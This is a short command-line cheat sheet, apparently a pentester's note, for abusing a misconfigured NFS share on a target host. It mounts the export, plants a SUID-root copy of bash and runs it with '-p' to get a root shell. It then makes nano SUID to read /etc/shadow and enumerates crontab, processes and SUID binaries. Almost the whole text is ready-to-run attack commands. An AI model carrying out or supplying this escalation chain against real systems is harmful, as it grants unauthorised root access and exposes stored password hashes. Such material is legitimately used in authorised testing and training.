Install the NFS tools on Kali 
```
apt-get install nfs-common
```
View the shares
```
showmount -e <ipAddress>
```

Do a scan:
```
nmap -sV --script=nfs-showmount <targetIP>
```

Create a diretory and mount the share: 
```
mkdir /tmp/nfs 
sudo mount -t nfs <ipAddress>/home /tmp/nfs 
cd /tmp/nfs cp /usr/bash # (Need to be a root user on the local machine) 
# OR try: 
cp /bin/bash 
chmod +s bash 
ls -lah bash 
sudo df -h
```

Now log into the target device: 
```
cd /home 
ls 
./bash -p 
id 
whoami 
# OR 
ssh -l user <ipAddress> 
cd /home 
./bash -p 
id
whoami
```

# Post Escalation
```
cp /bin/nano . 
chmod 4777 nano 
./nano -p /etc/shadow # (cntr+x to exit) 
cat /etc/crontab 
ps -ef 
find / -name “\*.txt“ -ls 2> /dev/null # Find the txt files on the system
route -n 
find / -perm -4000 -ls 2>/dev/null # View the SUID exectables
```


